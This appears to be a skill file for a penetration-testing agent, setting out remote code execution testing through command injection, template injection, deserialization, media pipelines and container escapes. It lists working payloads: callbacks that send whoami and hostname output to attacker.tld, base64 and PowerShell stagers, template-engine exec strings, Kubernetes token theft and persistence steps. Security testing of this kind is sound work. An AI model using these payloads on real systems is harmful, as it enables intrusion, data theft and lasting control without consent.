---
name: rce
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
---

# RCE

Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.

## Attack Surface

**Command Execution**
- OS command execution via wrappers (shells, system utilities, CLIs)

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm

**Deserialization**
- Insecure deserialization and gadget chains across languages

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives (FastCGI, Redis)

**Container Escalation**
- App RCE to node/cluster compromise via Docker/Kubernetes

## Detection Channels

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to reduce noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

**DNS**
```bash
nslookup $(whoami).x.attacker.tld
```

**HTTP**
```bash
curl https://attacker.tld/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

## Key Vulnerabilities

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**
- Inject flags/filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
- Break out of quoted segments by alternating quotes and escapes
- Environment expansion: `$PATH`, `${HOME}`, command substitution
- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) vs relying on PATH
- Use builtins or alternative tools (`printf`, `getent`) when `id` is filtered
- Use `sh -c` or `cmd /c` wrappers to reach the shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable building: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

### Template Injection

Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug

**Minimal Probes**
```
Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Deserialization and EL

**Java**
- Gadget chains via CommonsCollections/BeanUtils/Spring
- Tools: ysoserial
- JNDI/LDAP chains (Log4Shell-style) when lookups are reachable

**.NET**
- BinaryFormatter/DataContractSerializer
- APIs accepting untrusted ViewState without MAC

**PHP**
- `unserialize()` and PHAR metadata
- Autoloaded gadget chains in frameworks and plugins

**Python/Ruby**
- pickle, `yaml.load`/`unsafe_load`, Marshal
- Auto-deserialization in message queues/caches

**Expression Languages**
- OGNL/SpEL/MVEL/EL reaching Runtime/ProcessBuilder/exec

### Media and Document Pipelines

**ImageMagick/GraphicsMagick**
- policy.xml may limit delegates; still test legacy vectors
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript in PDFs/PS: `%pipe%id` file operators

**ExifTool**
- Crafted metadata invoking external tools or library bugs

**LaTeX**
- `\write18`/`--shell-escape`, `\input` piping; pandoc filters

**ffmpeg**
- concat/protocol tricks mediated by compile-time flags

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (build FPM records to invoke system/exec)

**Redis**
- `gopher://` write cron/authorized_keys or webroot
- Module load when allowed

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable internally

### Container and Kubernetes

**Docker**
- From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuses: mounted docker.sock, hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`

**Kubernetes**
- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
- Query API for pods/secrets; enumerate RBAC
- Talk to kubelet on 10250/10255; exec into pods
- Escalate via privileged pods, hostPath mounts, or daemonsets

## Bypass Techniques

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to reach alternate parsers

**Binary Alternatives**
- Absolute paths and alternate binaries (busybox, sh, env)
- Windows variations (PowerShell vs CMD)
- Constrained language bypasses

## Post-Exploitation

**Privilege Escalation**
- `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell behind auth
- Plugin hooks; supply chain in CI/CD

**Lateral Movement**
- SSH keys, cloud metadata credentials, internal service tokens

## Testing Methodology

1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** - User, working directory, PATH, shell, SELinux/AppArmor, containerization
4. **Map boundaries** - Read/write locations, outbound egress
5. **Progress to control** - File write, scheduled execution, service restart hooks

## Validation

1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
2. Show command context (uid, gid, cwd, env) and controlled output
3. Demonstrate persistence or file write under application constraints
4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across runs and transports

## False Positives

- Only crashes or timeouts without controlled behavior
- Filtered execution of a limited command subset with no attacker-controlled args
- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
- Simulated outputs not derived from executed commands

## Impact

- Remote system control under application user; potential privilege escalation to root
- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
- Cluster compromise when combined with container/Kubernetes misconfigurations

## Pro Tips

1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
2. When command injection is weak, pivot to file write or deserialization/SSTI paths
3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates
4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads
5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops

## Summary

RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
